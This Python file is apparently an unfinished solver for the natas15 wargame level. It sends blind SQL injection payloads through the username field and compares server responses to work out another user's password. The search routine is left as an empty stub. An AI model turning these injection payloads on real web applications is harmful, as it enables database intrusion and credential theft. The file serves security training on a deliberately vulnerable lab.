"""
natas15: "blind" SQL injection
"""

import asyncio
import aiohttp
from typing import NewType, Optional, Union

from natas_utils import *

LEVEL = 15

QUERY_SUCCESS_INDICATOR = "This user exists."

Less = NewType("LessThan", int)
Equal = NewType("EqualTo", int)
Greater = NewType("GreaterThan", int)

LT = Less(-1)
EQ = Equal(0)
GT = Greater(1)

def solve(url: str, login: LevelLogin) -> Optional[str]:
    return asyncio.run(solve_async(url, login))

async def solve_async(url: str, login: LevelLogin) -> Optional[str]:
    # need to extract user natas16's password
    user = "natas16"

    async with aiohttp.ClientSession(auth=aiohttp.BasicAuth(*login)) as session:
        response = await session.post(url, data={"username": "natas16"})

        print(await query_comparison(session, url, user, "0"))
        print(await query_comparison(session, url, user, "z"))

    return None

async def binary_search(session: aiohttp.ClientSession, url: str):
    pass

async def query_comparison(session: aiohttp.ClientSession, url: str, username: str, password: str) -> Union[Less, Equal, Greater]:
    """
    Query with a username and password, checking whether the given password is less than,
    equal to, or greater than the actual password.
    """
    # relevant source line:
    # `$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";`
    greater = {
        "username": f'{username}" and password > "{password}" --'
    }
    equal = {
        "username": f'{username}" and password = "{password}" --'
    }

    response_greater = query(session, url, greater)
    response_equal = query(session, url, equal)

    gt, eq = tuple(await asyncio.gather(response_greater, response_equal))

    if gt:
        return GT
    elif eq:
        return EQ
    else:
        return LT

async def query(session: aiohttp.ClientSession, url: str, data: dict) -> bool:
    response = await session.post(url, data=data)
    text = await response.text()
    print(text)
    return QUERY_SUCCESS_INDICATOR in text

if __name__ == "__main__":
    url, login = load_level(LEVEL)
    flag = solve(url, login)

    if flag:
        print("natas{:02}:".format(LEVEL + 1), flag)
        store_level_password(LEVEL + 1, flag)
    else:
        exit("Failed to get password for natas{:02}.".format(LEVEL + 1))